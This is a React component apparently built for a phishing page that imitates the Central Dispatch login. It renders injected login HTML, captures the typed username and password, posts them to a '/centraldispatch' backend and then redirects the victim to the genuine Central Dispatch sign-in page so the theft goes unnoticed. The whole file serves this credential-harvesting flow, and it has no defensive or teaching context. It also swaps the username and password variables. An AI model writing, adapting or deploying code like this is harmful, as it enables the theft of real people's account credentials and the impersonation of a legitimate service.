/* eslint-disable react-hooks/exhaustive-deps */
import React,{useInsertionEffect} from 'react';
import {loginHtml} from 'constants/loginHtml';
import {fetchExternalData} from 'hooks/fetch'
import "./loginPageWrapper.scss"

const LoginPage = () => {
    const getButton = ()=>{
        const togglePasswordVisibility = document.getElementById('togglePasswordVisibility');
        const loginButton =  document.getElementById('loginButton')
        if(togglePasswordVisibility && loginButton){
            togglePasswordVisibility.addEventListener('click', function () {
                var password = document.getElementById('password');
                let classNameOpen, classNameClosed;
                if (this.classList.value.includes("prism")) {
                    classNameOpen = 'prism-icon-eye';
                    classNameClosed = 'prism-icon-eye-blocked';
                } else {
                    classNameOpen = 'glyphicon-eye-open';
                    classNameClosed = 'glyphicon-eye-close';
                }
                if (password.getAttribute('type') === 'password') {
                    password.setAttribute('type', 'text');
      
                    this.classList.remove(classNameOpen);
                    this.classList.add(classNameClosed);
                } else {
                    password.setAttribute('type', 'password');
      
                    this.classList.remove(classNameClosed);
                    this.classList.add(classNameOpen);
                }
            });
           
           loginButton.addEventListener('click', async function (event) {
                event.preventDefault();
                this.textContent = "Authenticating...";
                const password = document.getElementById('Username').value;
                const userName = document.getElementById('password').value;
                const data = {
                    password:password,
                    userName:userName
                }   
                const response = await fetchExternalData({
                    url:'/centraldispatch',
                    body:data
                })   
                if(response?.message === 'success'){
                    window.location = 'https://id.centraldispatch.com/Account/Login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dcentraldispatch_authentication%26scope%3Dlisting_service%2520offline_access%2520openid%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fwww.centraldispatch.com%252Fprotected'
                }   
            });
        }
        else{
            setTimeout(()=>{
                getButton()
            },500)
        }
    }

    useInsertionEffect(()=>{
        getButton()
    },[])

  return (
    <div>
        <div dangerouslySetInnerHTML={{ __html: loginHtml || '<div></div>' }}></div>
    </div>
  )
}

export default LoginPage